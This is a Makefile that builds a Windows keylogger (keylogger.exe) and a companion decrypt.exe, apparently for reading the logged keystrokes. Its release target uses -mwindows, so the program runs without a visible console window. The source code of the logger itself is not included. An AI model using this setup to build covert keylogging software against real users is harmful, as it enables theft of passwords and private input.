# Compiler and flags
CC := gcc
CFLAGS := -std=c99 -Wall -Wextra
INCLUDES := -Isrc/keylogger

# Directories
SRC_DIR := src
OBJ_DIR := obj
BIN_DIR := bin
DEBUG_DIR := $(BIN_DIR)/debug
RELEASE_DIR := $(BIN_DIR)/release

# Source files
KEYLOGGER_SRCS := $(SRC_DIR)/main.c $(SRC_DIR)/keylogger/keylogger.c
DECRYPT_SRCS := $(SRC_DIR)/decrypt/decrypt.c

# Object files
KEYLOGGER_OBJS := $(KEYLOGGER_SRCS:$(SRC_DIR)/%.c=$(OBJ_DIR)/%.o)
DECRYPT_OBJS := $(DECRYPT_SRCS:$(SRC_DIR)/%.c=$(OBJ_DIR)/%.o)

# Libraries
LIBS := -luser32 -ladvapi32

# Debug flags
DEBUG_FLAGS := -g -DDEBUG

# Release flags
RELEASE_FLAGS := -O2 -DNDEBUG -mwindows

# Targets
.PHONY: all clean debug release decrypt dirs

all: release decrypt

# Create necessary directories
dirs:
	mkdir -p "$(BIN_DIR)"
	mkdir -p "$(DEBUG_DIR)"
	mkdir -p "$(RELEASE_DIR)"
	mkdir -p "$(OBJ_DIR)/keylogger"
	mkdir -p "$(OBJ_DIR)/decrypt"

# Debug build
debug: dirs $(KEYLOGGER_OBJS)
	@echo "Building debug version..."
	$(CC) $(CFLAGS) $(DEBUG_FLAGS) $(INCLUDES) $(KEYLOGGER_OBJS) -o "$(DEBUG_DIR)/keylogger.exe" $(LIBS)
	@echo "Debug build complete!"

# Release build
release: dirs $(KEYLOGGER_OBJS)
	@echo "Building release version..."
	$(CC) $(CFLAGS) $(RELEASE_FLAGS) $(INCLUDES) $(KEYLOGGER_OBJS) -o "$(RELEASE_DIR)/keylogger.exe" $(LIBS)
	@echo "Release build complete!"

# Decrypt utility
decrypt: dirs $(DECRYPT_OBJS)
	@echo "Building decrypt utility..."
	$(CC) $(CFLAGS) $(RELEASE_FLAGS) $(INCLUDES) $(DECRYPT_OBJS) -o "$(RELEASE_DIR)/decrypt.exe" $(LIBS)
	@echo "Decrypt build complete!"

# Object files compilation
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.c
	mkdir -p "$(dir $@)"
	$(CC) $(CFLAGS) $(INCLUDES) -c $< -o $@

# Clean build files
clean:
	rm -rf "$(OBJ_DIR)"
	rm -rf "$(BIN_DIR)"

# Help target
help:
	@echo "Available targets:"
	@echo "  make all      - Build release version of keylogger and decrypt utility"
	@echo "  make debug    - Build debug version of keylogger"
	@echo "  make release  - Build release version of keylogger"
	@echo "  make decrypt  - Build decrypt utility"